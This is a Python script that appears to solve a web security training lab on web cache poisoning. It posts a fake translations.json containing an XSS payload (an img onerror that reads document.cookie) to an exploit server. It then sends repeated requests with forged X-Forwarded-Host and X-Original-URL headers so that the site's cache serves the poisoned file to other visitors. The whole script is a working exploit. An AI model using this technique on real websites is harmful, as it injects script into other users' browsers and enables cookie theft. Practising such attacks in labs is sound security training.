from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import webbrowser
from selenium import webdriver
import time 
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
poison_url = burp_url + '/?localized=1'
set_es_lang_url = burp_url + '/setlang/es?'
set_en_lang_url = burp_url + '/setlang/en?'

session = requests.Session()


response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/resources/json/translations.json", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8\r\nAccess-Control-Allow-Origin: *", "responseBody": "{\r\n    \"en\": {\r\n        \"name\": \"English\"\r\n    },\r\n    \"es\": {\r\n        \"name\": \"español\",\r\n        \"translations\": {\r\n            \"Return to list\": \"Volver a la lista\",\r\n            \"View details\": \"</a><img src=1 onerror='alert(document.cookie)' />\",\r\n            \"Description:\": \"Descripción\"\r\n        }\r\n    }\r\n}", "formAction": "STORE"}

session.post(exploit_server, data=burp_data)

burp_headers_es = {"X-Forwarded-Host": exploit_server[8:] ,"X-Original-URL":"/setlang\es" ,"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}

session.get(burp_url, headers=burp_headers_es)

burp_headers = {"X-Forwarded-Host": exploit_server[8:] ,"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}

#print("wait 5-120sek")
for _ in range(10):
    session.get(poison_url, headers=burp_headers)
    session.get(burp_url, headers=burp_headers_es)

driver = webdriver.Chrome()
driver.get(set_en_lang_url)
time.sleep(3)
driver.quit()
